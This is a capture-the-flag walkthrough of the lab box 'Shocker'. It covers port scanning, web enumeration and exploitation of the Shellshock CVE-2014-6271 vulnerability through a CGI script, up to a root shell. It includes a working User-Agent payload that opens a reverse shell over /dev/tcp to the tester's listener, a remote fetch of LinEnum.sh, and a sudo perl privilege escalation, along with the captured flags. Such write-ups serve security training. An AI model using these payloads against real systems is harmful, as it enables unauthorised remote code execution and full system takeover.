
### Nmap Scan:

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sT -Pn 10.129.232.55 -sV -p- -O
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-31 11:00 EST
Nmap scan report for 10.129.232.55
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.08 seconds
```

### Web Server Enumeration:

```
┌──(kali㉿kali)-[~]
└─$ feroxbuster -u http://10.129.232.55 -f -n --dont-filter
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.232.55
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 500, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🤪  Filter Wildcards      │ false
 🪓  Add Slash             │ true
 🚫  Do Not Recurse        │ true
 🤘  Force Recursion       │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       11l       32w      296c http://10.129.232.55/cgi-bin/
200      GET      234l      773w    66161c http://10.129.232.55/bug.jpg
200      GET        9l       13w      137c http://10.129.232.55/
403      GET       11l       32w      294c http://10.129.232.55/icons/
403      GET       11l       32w      302c http://10.129.232.55/server-status/
[####################] - 25s    30001/30001   0s      found:5       errors:8     
[####################] - 25s    30000/30000   1216/s  http://10.129.232.55/   
```
- Scanning the /cgi-bin/ directory with common script types:
	- found http://10.129.232.55/cgi-bin/user.sh
```
┌──(kali㉿kali)-[~]
└─$ wget http://10.129.232.55/cgi-bin/user.sh
--2025-01-31 11:13:54--  http://10.129.232.55/cgi-bin/user.sh
Connecting to 10.129.232.55:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/x-sh]
Saving to: ‘user.sh’

user.sh                          [ <=>                                           ]     118  --.-KB/s    in 0s      

2025-01-31 11:13:54 (495 KB/s) - ‘user.sh’ saved [118]

┌──(kali㉿kali)-[~]
└─$ cat user.sh                                                                                            
Content-Type: text/plain

Just an uptime test script

 11:13:56 up 13:40,  0 users,  load average: 0.33, 2.90, 1.89

┌──(kali㉿kali)-[~]
└─$ uptime                      
 11:21:57 up 28 min,  2 users,  load average: 0.40, 0.49, 0.79

```
- file has filetype of text/x-sh
	- potential script execution
- returned text is the `uptime` command
### Testing for shellshock vulnerability
- send wget with modified user-agent string to the script identified.
```
┌──(kali㉿kali)-[~]
└─$ wget http://10.129.232.55/cgi-bin/user.sh --user-agent="() { :;}; echo; /bin/ping -c 1 10.10.14.3"
--2025-01-31 11:25:51--  http://10.129.232.55/cgi-bin/user.sh
Connecting to 10.129.232.55:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/x-sh]
Saving to: ‘user.sh.1’

user.sh.1                        [ <=>                                           ]     257  --.-KB/s    in 0s      

2025-01-31 11:25:52 (1.96 MB/s) - ‘user.sh.1’ saved [257]

┌──(kali㉿kali)-[~]
└─$ cat user.sh.1 
PING 10.10.14.3 (10.10.14.3) 56(84) bytes of data.
64 bytes from 10.10.14.3: icmp_seq=1 ttl=63 time=30.7 ms

--- 10.10.14.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 30.719/30.719/30.719/0.000 ms

┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.129.232.55 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-31 11:32 EST
Nmap scan report for 10.129.232.55
Host is up (0.027s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|_      http://seclists.org/oss-sec/2014/q3/685
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds

```
- start a listener and send a new user-agent string
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 3216
listening on [any] 3216 ...

-----------------------------------------------------------
┌──(kali㉿kali)-[~]
└─$ wget http://10.129.232.55/cgi-bin/user.sh --user-agent="() { :;}; echo; /bin/bash -i >& /dev/tcp/10.10.14.3/3216 0>&1"
--2025-01-31 11:37:19--  http://10.129.232.55/cgi-bin/user.sh
Connecting to 10.129.232.55:80... connected.
HTTP request sent, awaiting response... 
-----------------------------------------------------------
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 3216
listening on [any] 3216 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.232.55] 60038
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ 

```
- Shell returned!
	- upgrade the shell and find the user flag.
```
shelly@Shocker:/usr/lib/cgi-bin$ python3 -c 'import pty; pty.spawn("bash")'
python3 -c 'import pty; pty.spawn("bash")'
shelly@Shocker:/usr/lib/cgi-bin$ ls
ls
user.sh
shelly@Shocker:/usr/lib/cgi-bin$ cd /home/shelly
cd /home/shelly
shelly@Shocker:/home/shelly$ ls
ls
user.txt
shelly@Shocker:/home/shelly$ cat user.txt
cat user.txt
99e98781463ce81690ba16a69c5e729b
```
- look for ways to PrivEsc
	- start a local simple web server and transfer LinEnum.sh to the target
```
(Local Terminal)
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

-------------------------
(target)
shelly@Shocker:/home/shelly$ wget http://10.10.14.3:8000/LinEnum.sh
wget http://10.10.14.3:8000/LinEnum.sh
--2025-01-31 11:49:07--  http://10.10.14.3:8000/LinEnum.sh
Connecting to 10.10.14.3:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: 'LinEnum.sh'

LinEnum.sh          100%[===================>]  45.54K  --.-KB/s    in 0.08s   

2025-01-31 11:49:07 (580 KB/s) - 'LinEnum.sh' saved [46631/46631]

shelly@Shocker:/home/shelly$ ls
ls
LinEnum.sh  user.txt

```
- make the script executable and run.
```
<SNIP>
[+] We can sudo without supplying a password!
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl


[+] Possible sudo pwnage!
/usr/bin/perl
<SNIP>
```
- /usr/bin/perl can be used to escalate to root priv
	- go to gtfobins and pull the necessary command
	- verify the command before executing
```
shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/bash";'
sudo perl -e 'exec "/bin/bash";'
root@Shocker:/home/shelly# 
```
- Root shell returned!
	- find the root flag.
```
root@Shocker:/home/shelly# cd /root
cd /root
root@Shocker:~# ls
ls
root.txt
root@Shocker:~# cat root.txt
cat root.txt
51b6dc4ccdb20b9cfbd89cf98d857ae5
```
## Box PWND.